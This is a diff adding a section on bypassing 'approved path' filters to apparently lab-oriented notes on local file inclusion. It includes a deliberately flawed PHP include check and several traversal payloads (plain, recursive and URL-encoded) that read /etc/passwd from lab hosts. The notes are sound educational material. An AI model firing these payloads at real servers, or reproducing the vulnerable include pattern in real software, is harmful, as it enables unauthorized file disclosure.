@@ -111,3 +111,48 @@ http://94.237.49.23:48568/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2
 The above payload may work when input validation is performed before URL decoding, or when decoding is incomplete. In some cases, it is worth double or even triple URL encoding the payload. 
 
 ### Approved Paths Filter
+
+Some filters use regular expressions to ensure that any included file is under a specific path. An application may for example only accept included files under the **/languages/**. 
+
+An approved paths filter might look like this when implemented in PHP:
+
+```php
+$language = $_GET['language'];
+
+if (strpos($language, 'languages/') === 0) {
+    include($language);
+} else {
+    die('Invalid file path');
+}
+```
+
+To find the approved path we can examine a legitimate request to see what path is being utilized:
+
+```bash
+http://83.136.253.59:34423/index.php?language=languages/en.php
+```
+
+![Filtered output](images/approved-path.png)
+
+Approved path filters may be bypassed by prepending the approved path to the payload and then performing directory traversal from that location Approved path filters are often combined with a non-recursive search and replace filter and/or a character blacklist filter. Including recursive payloads and/or URL encoding may be a good idea.
+
+**Examples:**
+
+```bash
+# Basic approved path bypass
+http://83.136.253.59:34423/index.php?language=languages/../../../../etc/passwd
+```
+
+```bash
+# Recursive bypasses
+http://83.136.253.59:34423/index.php?language=languages/....//....//....//....//etc/passwd
+
+http://83.136.253.59:34423/index.php?language=languages/..././..././..././..././etc/passwd
+
+http://83.136.253.59:34423/index.php?language=languages/....\/....\/....\/....\/etc/passwd
+```
+
+```bash
+# Recursive and URL encoded bypass
+http://83.136.253.59:34423/index.php?language=languages%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%65%74%63%2f%70%61%73%73%77%64
+```
